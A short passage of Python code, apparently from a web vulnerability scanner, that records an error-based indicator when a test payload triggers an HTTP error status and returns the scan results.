                        results["indicators"].append(f"Error-based (HTTP {response.status_code})")
                        
                        self.scan_progress.emit(f"  ✅ Error-based: {payload_name} caused HTTP {response.status_code}")
        
        return results